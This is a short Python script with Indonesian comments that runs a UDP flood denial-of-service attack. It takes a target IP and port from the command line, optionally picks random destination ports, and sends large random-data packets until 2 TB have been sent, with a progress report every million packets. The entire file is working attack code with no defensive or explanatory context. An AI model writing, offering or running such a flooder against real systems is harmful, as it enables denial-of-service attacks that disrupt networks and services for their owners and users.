#!/usr/bin/python3
import socket
import random
import sys
import time

if len(sys.argv) == 1:
    sys.exit('Usage: f.py ip port(0=random)')

def UDPFlood():
    ip = sys.argv[1]
    port = int(sys.argv[2])
    randport = (True, False)[port == 0]

    # Hitung jumlah pengiriman untuk mencapai 2TB
    packet_size = 15000  # Ukuran tiap paket dalam bytes
    total_data = 2 * 1024 * 1024 * 1024 * 1024  # 2TB dalam bytes
    total_packets = total_data // packet_size  # Total paket yang perlu dikirim

    print(f"Flooding target: {ip}:{port or 'random'} for 2TB data")
    print(f"Total packets: {total_packets}")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(packet_size)

    sent_packets = 0  # Hitung jumlah paket yang dikirim
    start_time = time.time()
    while sent_packets < total_packets:
        target_port = (random.randint(1, 65535), port)[randport]
        sock.sendto(bytes, (ip, target_port))
        sent_packets += 1

        # Tampilkan progres setiap 1 juta paket
        if sent_packets % 1_000_000 == 0:
            elapsed_time = time.time() - start_time
            print(f"Sent: {sent_packets}/{total_packets} packets ({(sent_packets * packet_size) / (1024 ** 3):.2f} GB) in {elapsed_time:.2f} seconds")
    
    print("DONE - 2TB Data Sent")

# Panggil fungsi UDPFlood
UDPFlood()
